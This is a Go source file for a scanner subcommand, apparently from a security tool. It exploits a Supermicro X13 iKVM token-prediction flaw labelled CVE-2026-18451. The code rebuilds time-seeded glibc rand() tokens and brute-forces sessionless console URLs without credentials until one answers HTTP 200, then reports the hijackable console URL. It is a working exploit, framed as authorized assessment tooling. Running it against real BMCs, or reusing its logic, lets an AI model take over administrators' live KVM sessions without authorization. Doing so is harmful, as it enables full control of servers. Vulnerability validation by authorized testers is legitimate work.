package cmd

import (
	"context"
	"fmt"
	"io"
	"net"
	"net/http"
	"strconv"
	"sync"
	"sync/atomic"
	"time"

	"github.com/spf13/cobra"

	"github.com/runZeroInc/oobscan/pkg/httpx"
	"github.com/runZeroInc/oobscan/pkg/netaddr"
	"github.com/runZeroInc/oobscan/pkg/smckvm"
)

var (
	smckvmPort        int
	smckvmTime        string
	smckvmMax         time.Duration
	smckvmFuture      time.Duration
	smckvmConcurrency int
	smckvmTimeout     time.Duration
)

var smckvmCmd = &cobra.Command{
	Use:   "smc-kvm [flags] <host>",
	Short: "CVE-2026-18451: validate predictable Supermicro X13 iKVM launch tokens.",
	Long: `smc-kvm validates the Supermicro X13 Redfish HTML5 iKVM console
token-prediction finding during an authorized assessment. The token uses the glibc PRNG seeded
with the wall-clock second (srand(time(NULL)) + 15x gen_random()).

Given an estimate of when an administrator launched a KVM session, smc-kvm walks
backward second by second from that estimate, reconstructs the exact token each
second would have produced, and requests the corresponding console URL
(/redfish/<token>.IKVM) with no cookie or credential. A live token returns the
HTML5 console (HTTP 200); every other second returns 404. On the first 200 it
prints the accessible console URL and stops. That URL is sensitive access
material. Limit testing to an agreed test session and do not open unrelated
users' consoles.

The token generator is glibc's TYPE_3 rand() with the gen_random() 62-character
alphabet recovered from libredfish.so; see pkg/smckvm.

The estimate (--time) is interpreted in the BMC's clock domain (UNIX seconds are
timezone-independent; a bare date/time string is parsed as UTC). Widen --max if
the launch time is uncertain, and use --future to allow for the estimate being
slightly before the real launch (clock skew).

Examples:

  # search the hour before now
  oobscan smc-kvm 192.0.2.10

  # search back 15 minutes from a known launch time
  oobscan smc-kvm --time "2026-07-16 06:20:00" --max 15m 192.0.2.10

  # search from a UNIX timestamp on a non-default port
  oobscan smc-kvm --time 1784182965 --max 10m --port 8443 192.0.2.10`,
	Args: cobra.ExactArgs(1),
	RunE: runSMCKVM,
}

func init() {
	f := smckvmCmd.Flags()
	f.IntVarP(&smckvmPort, "port", "p", 443, "HTTPS port of the BMC web interface")
	f.StringVarP(&smckvmTime, "time", "t", "",
		"estimated launch time to start from: UNIX seconds, RFC3339, or 'YYYY-MM-DD HH:MM:SS' (UTC); default: now")
	f.DurationVar(&smckvmMax, "max", time.Hour, "maximum period to walk backward from the start time")
	f.DurationVar(&smckvmFuture, "future", 0, "also test this far AFTER the start time first (clock-skew allowance)")
	f.IntVarP(&smckvmConcurrency, "concurrency", "c", 24, "number of concurrent probes")
	f.DurationVar(&smckvmTimeout, "timeout", 8*time.Second, "per-request timeout")
	rootCmd.AddCommand(smckvmCmd)
}

func runSMCKVM(_ *cobra.Command, args []string) error {
	host := args[0]
	start, err := parseSMCKVMTime(smckvmTime)
	if err != nil {
		return err
	}
	if smckvmMax < 0 || smckvmFuture < 0 {
		return fmt.Errorf("--max and --future must not be negative")
	}
	if smckvmConcurrency < 1 {
		smckvmConcurrency = 1
	}

	startUnix := start.Unix()
	backSecs := int64(smckvmMax / time.Second)
	fwdSecs := int64(smckvmFuture / time.Second)
	total := backSecs + fwdSecs + 1
	base := "https://" + netaddr.URLHostPort(host, smckvmPort)

	log().Infof("smc-kvm: %s starting %s UTC, window -%s..+%s (%d seconds), concurrency %d",
		base, start.UTC().Format("2006-01-02 15:04:05"), smckvmMax, smckvmFuture, total, smckvmConcurrency)

	client := httpx.Client(smckvmTimeout)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	var (
		hitURL  atomic.Pointer[string]
		hitSeed atomic.Int64
		tested  atomic.Int64
		wg      sync.WaitGroup
	)

	seeds := make(chan uint32)
	for range smckvmConcurrency {
		wg.Go(func() {
			for seed := range seeds {
				if ctx.Err() != nil {
					return
				}
				path := smckvm.TokenPath(seed)
				ok, perr := smckvmProbe(ctx, client, base+path)
				tested.Add(1)
				if perr != nil {
					// A probe error (timeout, reset) is not a match; keep sweeping.
					continue
				}
				if ok {
					u := base + path
					if hitURL.CompareAndSwap(nil, &u) {
						hitSeed.Store(int64(seed))
						cancel()
					}
					return
				}
			}
		})
	}

	// Progress heartbeat while the sweep runs.
	done := make(chan struct{})
	go func() {
		t := time.NewTicker(3 * time.Second)
		defer t.Stop()
		for {
			select {
			case <-done:
				return
			case <-t.C:
				log().Infof("smc-kvm: tested %d/%d seconds...", tested.Load(), total)
			}
		}
	}()

	// Feed candidate seconds: the clock-skew window first (start+future down to
	// start+1), then the estimate and backward to start-max.
	go func() {
		defer close(seeds)
		for off := fwdSecs; off >= 1; off-- {
			select {
			case <-ctx.Done():
				return
			case seeds <- uint32(startUnix + off):
			}
		}
		for off := int64(0); off <= backSecs; off++ {
			select {
			case <-ctx.Done():
				return
			case seeds <- uint32(startUnix - off):
			}
		}
	}()

	wg.Wait()
	close(done)

	if p := hitURL.Load(); p != nil {
		seed := hitSeed.Load()
		// Report the recovered token as a Critical finding: a live iKVM console
		// session was taken over unauthenticated, from the launch time alone.
		log().Critical("iKVM launch token recovered",
			"ip", net.JoinHostPort(host, strconv.Itoa(smckvmPort)),
			"seed", strconv.FormatInt(seed, 10),
			"launch_utc", time.Unix(seed, 0).UTC().Format("2006-01-02 15:04:05"),
			"probes", strconv.FormatInt(tested.Load(), 10),
			"url", *p)
		return nil
	}

	return fmt.Errorf("no live iKVM launch token found in the window (tested %d seconds); "+
		"the console session may not be active, or the launch time is outside -%s..+%s of %s UTC",
		tested.Load(), smckvmMax, smckvmFuture, start.UTC().Format("2006-01-02 15:04:05"))
}

// smckvmProbe GETs the sessionless console URL with no cookie or credential and
// reports whether the BMC accepted the token (HTTP 200, the console bootstrap)
// versus refused it (404). Any transport error is returned so the caller can
// distinguish it from a clean refusal.
func smckvmProbe(ctx context.Context, client *http.Client, url string) (bool, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		return false, err
	}
	resp, err := client.Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()
	// Drain a bounded prefix so the connection can be reused/closed cleanly.
	_, _ = io.Copy(io.Discard, io.LimitReader(resp.Body, 4096))
	return resp.StatusCode == http.StatusOK, nil
}

// parseSMCKVMTime accepts UNIX seconds, RFC3339, or a bare "YYYY-MM-DD HH:MM:SS"
// / "YYYY-MM-DD" string (parsed as UTC). An empty string means now.
func parseSMCKVMTime(s string) (time.Time, error) {
	if s == "" {
		return time.Now().UTC(), nil
	}
	if n, err := strconv.ParseInt(s, 10, 64); err == nil {
		return time.Unix(n, 0).UTC(), nil
	}
	for _, layout := range []string{
		time.RFC3339,
		"2006-01-02T15:04:05",
		"2006-01-02 15:04:05",
		"2006-01-02 15:04",
		"2006-01-02",
	} {
		if t, err := time.Parse(layout, s); err == nil {
			return t.UTC(), nil
		}
	}
	return time.Time{}, fmt.Errorf("cannot parse --time %q (use UNIX seconds, RFC3339, or 'YYYY-MM-DD HH:MM:SS')", s)
}
